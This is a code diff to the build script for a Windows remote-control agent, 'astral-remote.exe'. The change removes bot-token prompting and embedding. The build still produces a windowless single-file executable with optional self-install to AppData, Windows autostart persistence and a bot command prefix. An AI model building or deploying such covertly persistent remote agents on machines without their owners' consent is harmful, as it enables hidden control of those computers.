@@ -1,5 +1,5 @@
 # EXE build pipeline for dist/astral-remote.exe.
-# Flow: validate token and default config before work, create an isolated
+# Flow: validate non-secret default config before work, create isolated
 # staging package copy under build-tmp/, generate _embedded_payload.py
 # only inside that staged copy, run PyInstaller --onefile --noconsole,
 # verify size/PE subsystem/smoke, then atomically publish into dist/.
@@ -24,8 +24,7 @@ import sys
 import time
 from pathlib import Path
 
-from astral_remote.agent.payload import is_plausible_bot_token
-from astral_remote.agent.secure_input import InterruptedError, prompt_for_token
+from astral_remote.agent.secure_input import InterruptedError
 from astral_remote.builder.payload_codegen import render_payload_module
 from astral_remote.builder.subsystem import set_gui_subsystem
 from astral_remote.builder.verification import check_gui_subsystem, check_size, self_test, smoke_test
@@ -60,15 +59,6 @@ def _cleanup_tracked() -> None:
 
 
 atexit.register(_cleanup_tracked)
-
-
-def prompt_build_token(show_header: bool = True) -> str:
-    """Secure build-time token prompt. Masked input, empty rejected.
-
-    `show_header` is forwarded to the token prompt. The interactive menu
-    passes False because it keeps its own prompt block on screen.
-    """
-    return prompt_for_token(show_header=show_header)
 
 
 DEFAULT_EXE_NAME = "astral-remote.exe"
@@ -212,15 +202,6 @@ def prompt_autostart() -> bool:
     return prompt_bool("Register Windows autostart", default=True)
 
 
-def resolve_build_token(token=None, prompt_token=None) -> str:
-    """Resolve the build token from an argument or secure prompt, validated first."""
-    prompt = prompt_token if prompt_token is not None else prompt_build_token
-    live = token if token is not None else prompt()
-    if not is_plausible_bot_token(live):
-        raise BuildError("Token rejected: expected bot token shape (three dot-separated parts).")
-    return live.strip()
-
-
 def _ensure_pyinstaller() -> None:
     """Fail fast when the interpreter running the build lacks PyInstaller.
 
@@ -317,10 +298,10 @@ def _stage_log_path() -> Path:
     return DIST_DIR / f"build-py-{stamp}.log"
 
 
-def build_agent(token=None, prompt_token=None, on_stage=None, output_name: str | None = None,
+def build_agent(on_stage=None, output_name: str | None = None,
                 install_to_appdata: bool = True, enable_autostart: bool = True,
                 prefix: str = DEFAULT_BOT_PREFIX) -> dict:
-    """Generate the EXE with an embedded token plus default non-secret config.
+    """Generate EXE with default non-secret runtime configuration.
 
     `install_to_appdata` and `enable_autostart` are embedded as the EXE's
     build-time self-install choices. The output name (without extension)
@@ -356,13 +337,12 @@ def build_agent(token=None, prompt_token=None, on_stage=None, output_name: str |
         except (OSError, ValueError, AttributeError):
             pass
     try:
-        live_token = resolve_build_token(token, prompt_token)
         log(f"Generating AstralRemote-Agent v{staged_config['agentVersion']} for win-x64 PyInstaller onefile.")
         log(f"Command prefix: {bot_prefix}")
         stage = _stage_package()
         try:
             log("Preparing template")
-            module_source = render_payload_module(live_token, staged_config)
+            module_source = render_payload_module(staged_config)
             (stage / "pkg" / "astral_remote" / "_embedded_payload.py").write_text(module_source, encoding="utf-8")
             try:
                 os.chmod(stage / "pkg" / "astral_remote" / "_embedded_payload.py", 0o600)
